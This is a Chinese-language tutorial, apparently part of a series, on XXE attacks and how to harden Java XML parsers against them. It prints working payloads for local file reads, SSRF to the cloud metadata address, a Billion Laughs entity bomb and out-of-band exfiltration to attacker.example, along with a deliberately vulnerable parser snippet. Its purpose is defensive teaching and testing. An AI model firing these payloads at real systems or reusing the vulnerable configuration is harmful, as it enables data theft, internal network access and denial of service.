XML 解析器默认愿意做很多"贴心"的事：读取外部 DTD、展开实体、访问远程 schema。对可信文件这是便利，对用户上传的 XML 就是攻击入口。XXE（XML External Entity）长期排在安全风险前列，本篇讲原理、攻击面和加固方式。

# 1. XXE 是什么

## 1.1 外部实体

XML 允许在 DTD 里定义实体，实体的值可以来自外部资源：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

解析器读到 `&xxe;` 时，会去读取 `file:///etc/passwd`，把文件内容替换到 `foo` 元素里。如果程序随后把 `foo` 的内容返回给用户，文件就泄露了。

## 1.2 攻击链

```text
攻击者提交 XML
      │
      ▼
解析器读取 DOCTYPE
      │
      ▼
解析器加载外部实体 ──→ 本地文件 / 内网 URL / 远程 DTD
      │
      ▼
实体内容进入文档树
      │
      ▼
业务代码回显、记录日志或触发后续请求
      │
      ▼
信息泄露 / SSRF / 拒绝服务
```

★ **关键认知**：XXE 的根因不是"XML 有实体"，而是**解析器被允许访问外部资源，且解析结果进入了业务输出**。防御的重点是切断外部资源访问，而不是过滤某个关键字。

# 2. 攻击面

## 2.1 文件读取

最常见的载荷：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Windows 目标可以尝试：

```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
```

能否成功取决于进程权限、文件路径和解析器配置。即使不回显，攻击者也可能通过报错信息、响应时间或外带请求判断文件是否存在。

## 2.2 SSRF

外部实体不限于 `file://`，也可以指向 HTTP 地址：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

解析器所在的服务器会替攻击者发起请求。如果它运行在云环境，可能访问元数据服务；如果在内网，可能探测只有内网可达的服务。

⚠ 这类 SSRF 的危险在于**请求从服务器发出**，绕过了外部防火墙对攻击者的限制。即使响应内容不回显，攻击者也能通过 DNS 查询或请求日志确认可达性。

## 2.3 Billion Laughs

实体可以引用其他实体，形成指数级展开：

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

每一层放大十倍，几层就能耗尽内存和 CPU。这类攻击叫 Billion Laughs，也叫实体膨胀攻击。

## 2.4 盲注与外带

当解析结果不回显时，攻击者可以用参数实体把数据拼进远程 URL：

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
```

远程 DTD 再把 `%file;` 的内容拼到请求路径里。服务器一旦加载远程 DTD，就会把本地文件内容带到攻击者域名。这种手法叫 Out-of-Band（OOB）外带。

# 3. 漏洞示例

## 3.1 脆弱代码

```java
import javax.xml.parsers.DocumentBuilderFactory;

var factory = DocumentBuilderFactory.newInstance();
var builder = factory.newDocumentBuilder();

// 默认配置可能允许 DTD 和外部实体
var doc = builder.parse(new java.io.FileInputStream("upload.xml"));
System.out.println(doc.getDocumentElement().getTextContent());
```

这段代码没有显式开启任何危险特性，但很多解析器的默认行为就包含 DTD 支持。攻击者上传前面的载荷，文件内容就可能进入 `getTextContent()`。

## 3.2 为什么默认不安全

| 默认行为 | 风险 |
|----------|------|
| 解析 DOCTYPE | 允许定义实体 |
| 加载外部 DTD | 可访问远程资源 |
| 展开外部实体 | 可读取文件、发起 SSRF |
| 支持 XInclude | 可包含其他文档 |
| 加载外部 schema | 校验时可能发起网络请求 |

★ **关键认知**：安全配置必须**显式写出来**。不要假设"JDK 新版本默认安全"，不同版本、不同实现、不同封装库的默认值并不一致，升级依赖也不能替代配置。

# 4. 防御

## 4.1 首选禁用 DTD

如果业务不需要 DTD，最彻底的做法是直接禁止 DOCTYPE：

```java
var factory = DocumentBuilderFactory.newInstance();
factory.setFeature(
        "http://apache.org/xml/features/disallow-doctype-decl", true);
```

开启后，任何带 `<!DOCTYPE>` 的文档都会解析失败。这是最推荐的第一道防线。

## 4.2 DOM 与 SAX 加固

需要兼容 DTD 但不能访问外部资源时，组合使用下面的配置：

```java
import javax.xml.XMLConstants;

var factory = DocumentBuilderFactory.newInstance();
factory.setFeature(
        "http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature(
        "http://xml.org/sax/features/external-general-entities", false);
factory.setFeature(
        "http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature(
        "http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

// 限制解析器可访问的外部资源
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

SAX 的配置方式相同：

```java
var factory = javax.xml.parsers.SAXParserFactory.newInstance();
factory.setFeature(
        "http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature(
        "http://xml.org/sax/features/external-general-entities", false);
factory.setFeature(
        "http://xml.org/sax/features/external-parameter-entities", false);
```

`disallow-doctype-decl` 和后面几个特性有重叠，但多层配置能覆盖不同解析器实现的差异。

## 4.3 StAX 加固

StAX 用属性控制 DTD 和外部实体：

```java
var factory = javax.xml.stream.XMLInputFactory.newInstance();
factory.setProperty(javax.xml.stream.XMLInputFactory.SUPPORT_DTD, false);
factory.setProperty(
        javax.xml.stream.XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
factory.setProperty(
        javax.xml.stream.XMLInputFactory.IS_REPLACING_ENTITY_REFERENCES, false);
```

不同实现可能使用字符串属性名，例如 `javax.xml.stream.isSupportingExternalEntities`。升级 StAX 实现时，建议写测试确认配置真的生效。

## 4.4 XSLT 与 Schema

XSLT 处理器也会加载外部 DTD 和样式表：

```java
var factory = javax.xml.transform.TransformerFactory.newInstance();
factory.setAttribute(javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setAttribute(javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
```

schema 校验同样要限制外部引用：

```java
var factory = javax.xml.validation.SchemaFactory.newInstance(
        javax.xml.XMLConstants.W3C_XML_SCHEMA_NS_URI);
factory.setProperty(javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setProperty(javax.xml.XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

⚠ 把 `ACCESS_EXTERNAL_SCHEMA` 设为空字符串会禁止 schema 通过 `xs:import`、`xs:include` 加载外部文件。如果 schema 确实需要拆分，应该用本地 catalog 或受控的 `LSResourceResolver`，不要直接放开网络访问。

## 4.5 纵深措施

- 在入口层拒绝包含 `<!DOCTYPE` 或 `<!ENTITY` 的请求，前提是业务不需要 DTD。
- 限制请求体大小、解析时间和实体展开数量。
- 解析服务使用低权限账号，限制可读文件和内网访问。
- 禁止解析器所在主机访问不必要的元数据地址和内网网段。
- 使用最新版本的解析器和安全补丁。
- 对上传文件做类型、大小、来源校验，不要只依赖后缀名。

★ **关键认知**：**禁用 DTD 是主防线，网络隔离和权限控制是兜底**。只做其中一层都不够：配置可能被某个库覆盖，网络策略也可能有遗漏。

# 5. 验证加固

写一个测试载荷，确认解析器在 DOCTYPE 处直接失败：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

```java
try {
    builder.parse(new java.io.ByteArrayInputStream(payload.getBytes()));
    throw new AssertionError("危险配置：载荷竟然解析成功");
} catch (org.xml.sax.SAXParseException e) {
    System.out.println("已拦截：" + e.getMessage());
}
```

还应验证：

- 文件读取载荷无法得到内容。
- HTTP 外部实体没有发出网络请求。
- 指数实体在限制内报错，而不是耗尽内存。
- XInclude 和外部 schema 不会触发额外请求。

# 6. 常见误区

| 误区 | 为什么不对 |
|------|------------|
| 只关外部通用实体就够了 | 参数实体、外部 DTD 仍可能被利用 |
| `setExpandEntityReferences(false)` 就能防住 | 它只影响是否展开，不阻止加载 |
| 新 JDK 默认安全 | 默认值随实现和版本变化，不能假设 |
| 只防 DOM 就行 | SAX、StAX、XSLT、JAXB 都可能有同类问题 |
| 用正则过滤 `SYSTEM` | 编码、大小写、参数实体都能绕过 |
| 内网接口不需要防 | SSRF 正是从内网发起的 |

# 7. 动手练习

1. 用未加固的 DOM 解析器解析文件读取载荷，观察是否把内容读进文档；再打开 `disallow-doctype-decl` 对比结果。
2. 给 StAX 配置禁用 DTD 和外部实体，写一个单元测试断言解析失败。
3. 检查项目里所有 `DocumentBuilderFactory`、`SAXParserFactory`、`XMLInputFactory`、`TransformerFactory` 的创建点，确认每个都做了安全配置。

# 8. 小结

| 主题 | 要点 |
|------|------|
| XXE | 外部实体被解析器加载并进入业务数据 |
| 文件读取 | `file://` 读取本地文件 |
| SSRF | `http://` 让服务器访问内网或元数据 |
| 实体膨胀 | 指数展开耗尽内存 |
| 主防线 | 禁用 DOCTYPE、禁用外部实体 |
| 兜底 | 网络隔离、低权限、大小与时间限制 |
| 验证 | 用攻击载荷写回归测试 |

下一篇做收尾，比较 XML 与 JSON/YAML 的选型，整理 schema 管理、性能和安全清单，并给出继续学习的方向。
